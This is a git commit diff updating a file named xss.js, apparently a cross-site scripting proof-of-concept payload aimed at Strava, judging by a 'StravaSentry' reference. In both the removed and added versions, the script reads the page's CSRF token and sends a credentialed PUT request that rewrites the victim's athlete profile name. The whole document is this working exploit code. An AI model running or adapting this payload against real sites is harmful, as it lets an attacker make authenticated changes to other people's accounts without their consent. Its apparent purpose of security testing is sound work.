c748be23d90a031b7ecc122677b9c6a6d6046328
Majed Refaea <47279932+MajedRE@users.noreply.github.com>
2025-06-19 16:53:42 +0100

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,7 +1,15 @@
-t = document.querySelector('meta[name="csrf-token"]').content;
-x = new XMLHttpRequest;
-x.open("PUT", "/athletes/128798963", 1);
-x.withCredentials = 1;
-x.setRequestHeader("X-Csrf-Token", t);
-x.setRequestHeader("Content-Type", "application/json");
-x.send(JSON.stringify({ athlete: { firstname: "XSS" } }));
+(async()=>{
+  const id = window.StravaSentry?.userId;
+  const csrf = document.querySelector('meta[name="csrf-token"]').content;
+  const res = await fetch('/athletes/' + id, {
+    method: 'PUT',
+    credentials: 'include',
+    headers: {
+      'X-Csrf-Token': csrf,
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      athlete: { firstname: 'xss', lastname: 'test' }
+    })
+  });
+})();
